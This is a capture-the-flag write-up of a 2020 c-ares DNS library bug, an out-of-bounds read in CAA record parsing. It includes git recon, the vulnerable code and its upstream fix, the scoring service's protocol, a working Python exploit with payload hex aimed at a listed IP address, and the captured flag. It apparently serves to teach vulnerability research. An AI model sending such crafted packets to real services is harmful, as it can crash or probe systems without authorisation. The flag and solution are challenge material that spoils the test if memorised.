# VULN#003 — DNS response inspection service (c-ares CAA OOB read)

**Brief (verbatim):** *"A DNS response inspection service parses whatever DNS reply you
send it. You are given the exact source tree the target binary is built from."*
**Deliverable:** `c-ares-src.tar.gz` — reports `ARES_VERSION_STR "1.16.1"` internally.
**Flag:** `CTF{7be3ffc6c7dd708e925627551706e233}`

### 0. TL;DR

The provided source is *unmodified* upstream c-ares pinned to the commit that first
introduced CAA record parsing (`89e9eeb`, fuzz harness for CAA; parent `f5b4c085` added the
parser itself — both 2020-09-26). Send a CAA answer RR with `RDLENGTH = 0` at the end of
the packet and `ares_parse_caa_reply()` reads 2 bytes past the end of the response buffer
(OSS-Fuzz issue 26012, fixed upstream two days later by `4d6975b3`). The scoring service
detects the over-read (ASAN-style) and awards the flag.

> **Lesson:** in this series an *empty* diff against upstream is the finding. The tree is
> pinned to a pre-fix commit, so `git log` on the newest files hands you the vulnerability.

### 1. Recon — the source tree is pristine, and that's the hint

`c-ares-src.tar.gz` says `ARES_VERSION_STR "1.16.1"`, but it uses the `src/lib` layout and
contains `src/lib/ares_parse_caa_reply.c`, which does **not** exist in the 1.16.1 release
tarball (CAA parsing shipped in 1.17.0). So it is a git snapshot of master, not a release.

Diffing the whole tree against upstream git identifies the commit exactly:

```
$ git clone https://github.com/c-ares/c-ares.git
$ git -C c-ares log --oneline --until=2020-09-27 -3
89e9eeb fuzz CAA parsing (#363)
f5b4c08 Allow parsing of CAA Resource Record (#360)
05eb0c1 docs: remove the html and pdf make targets

$ git -C c-ares checkout 89e9eeb
$ diff -ru c-ares extracted/
Only in c-ares: test
```

**Zero differences** apart from the stripped `test/` directory (and `travis/test.sh`), so
nothing was injected — the bug is a real upstream bug, and the two newest commits in the
snapshot both touch the brand-new CAA parser. That is the whole challenge in one line:
the tree is pinned to the commit *before* the fix.

Confirm by asking git what happened to that file next:

```
$ git log --reverse --oneline origin/main -- src/lib/ares_parse_caa_reply.c
f5b4c08 Allow parsing of CAA Resource Record (#360)
4d6975b Fix OSSFuzz reported issue in CAA reply parsing      <-- the fix we are missing
```

Note the version string is a red herring *in both directions*: it claims 1.16.1 (wrong —
the tree is later), yet 1.16.1's own known bugs (e.g. SOA over-read CVE-2020-22217, which
the tree already contains the fix for) are not the target either. The only bugs present are
those introduced by the snapshot's own tip commits: the CAA `rr_len` OOB read and (also
present but not the scored trigger) `*naddrttls = naddrs` over-report in
`ares_parse_{a,aaaa}_reply` (fixed 2020-11-12, `0d252eb3`) and the empty-`hquery->name`
read in `ares_getaddrinfo` (query path, unreachable from a parse-only wrapper).

### 2. The bug

`src/lib/ares_parse_caa_reply.c`. `rr_len` is attacker-controlled RDLENGTH. The only bounds
check before the rdata is touched is an *upper* bound:

```c
rr_len = DNS_RR_LEN (aptr);
aptr += RRFIXEDSZ;
if (aptr + rr_len > abuf + alen)      /* passes trivially for rr_len == 0 */
  { status = ARES_EBADRESP; break; }
...
strptr = aptr;
caa_curr->critical = (int)*strptr++;  /* read rdata[0] */
caa_curr->plength  = (int)*strptr++;  /* read rdata[1] */
```

There is no *lower* bound on `rr_len`, and the two reads are unconditional. With `rr_len == 0`
and the record placed at the very end of the packet, `strptr` points at `abuf + alen`, so both
reads are **out of bounds of the response buffer** — the use-of-uninitialized-value / heap
over-read that OSS-Fuzz reported (issue 26012).

Upstream fix (`4d6975b`):

```diff
   caa_last = caa_curr;
-
-  caa_curr->critical = (int)*strptr++;
+  if (rr_len < 2)
+    {
+      status = ARES_EBADRESP;
+      break;
+    }
+  caa_curr->critical = (int)*strptr++;
   caa_curr->plength = (int)*strptr++;
```

### Why it dead-ends there (don't burn hours escalating it)

After the two OOB reads the parser immediately bails: `plength` comes from an `unsigned char`
(>= 0), and the next check is

```c
if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2)   /* rr_len - 2 == -2 */
```

always true for `rr_len == 0` → `ARES_EBADRESP`, list freed, return. The subsequent
`plength`/`length` arithmetic is sound (`2 + plength + length == rr_len` exactly), so there is
**no OOB write and no leak path** — pure read-OOB / uninit trigger (ASAN-detectable), not a
control-flow bug. The scoring service only needs the trigger.

### 3. The wire protocol

No banner; the service waits for input. Framing is a **4-byte big-endian length prefix
followed by that many raw DNS bytes**. Raw packets get rejected because the service eats the
DNS header as a length:

| what you send            | response                       |
|--------------------------|--------------------------------|
| raw packet / `\n` / hex  | `status: bad length`           |
| 2-byte length prefix     | `status: bad length`           |
| **4-byte length prefix** | parsed                         |
| truncated or junk buffer | `status: not valid`            |
| well-formed, bug not hit | `status: no effect`            |
| **bug triggered**        | `status: confirmed` + FLAG     |
| too many requests        | `status: rate limited, try again later` |

One-shot-per-interval oracle — pace probes; rate limit kicks in after a handful of
connections (observed: mapping the statuses costs requests; the trigger needs only ~3).

### 4. Exploit

```python
#!/usr/bin/env python3
# VULN#003 - c-ares ares_parse_caa_reply() OOB read (missing rr_len < 2 check)
import socket, struct

HOST, PORT = '169.58.126.107', 7028

def name(n):
    return b''.join(bytes([len(l)]) + l.encode() for l in n.split('.') if l) + b'\x00'

qname = 'example.com'
pkt  = struct.pack('>HHHHHH', 0x1234, 0x8180, 1, 1, 0, 0)   # QDCOUNT=1, ANCOUNT=1
pkt += name(qname) + struct.pack('>HH', 257, 1)             # question: QTYPE=CAA(257), IN
pkt += name(qname) + struct.pack('>HHIH', 257, 1, 60, 0)    # CAA answer, RDLENGTH=0  <-- bug
                                                            # (no rdata follows: RR ends the buffer)

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(struct.pack('>I', len(pkt)) + pkt)                # 4-byte BE length framing
s.shutdown(socket.SHUT_WR)
print(s.recv(4096).decode(errors='replace'))
```

Payload hex:

```
123481800001000100000000076578616d706c6503636f6d0001010001076578616d706c6503636f6d00010100010000003c0000
```

Result:

```
status: confirmed
FLAG: CTF{7be3ffc6c7dd708e925627551706e233}
```

### Design cookbook (for reuse)

- **When a pwn challenge ships "the exact source tree", diff it against upstream git first.**
  An empty diff is itself the finding: the tree is pinned to a pre-fix commit, so `git log`
  on the newest files hands you the vulnerability. Identify the exact commit by `diff`ing the
  extracted tree against `git archive <commit>` (here: `89e9eeb`).
- **The newest file in a snapshot is the weakest file.** Both tip commits touched the CAA
  parser, one even adding a fuzzer for it — upstream had not yet run it. `git log --reverse
  --oneline -- <file>` on a suspicious file shows the fix landing right after the snapshot.
- **Version strings are claims, not evidence** (same lesson as VULN#005): `1.16.1` here was
  wrong in both directions — the tree is neither 1.16.1 nor vulnerable to 1.16.1's famous
  bugs; it is a precise mid-development commit whose own new code is the bug.
- **Map the wrapper's oracle before concluding anything.** The status strings (`bad length`,
  `not valid`, `no effect`, `confirmed`, `rate limited`) are custom and absent from the
  provided source — a few spaced probes establish the whole table, and `no effect` on a
  clean packet confirms framing without burning the budget.
- **Three requests were enough:** establish framing, send a clean packet (`no effect`) to
  confirm the oracle, then send the trigger. Everything else burned rate limit.

---

## VULN#005 — Acme Gateway (GoAhead 6.1.1)
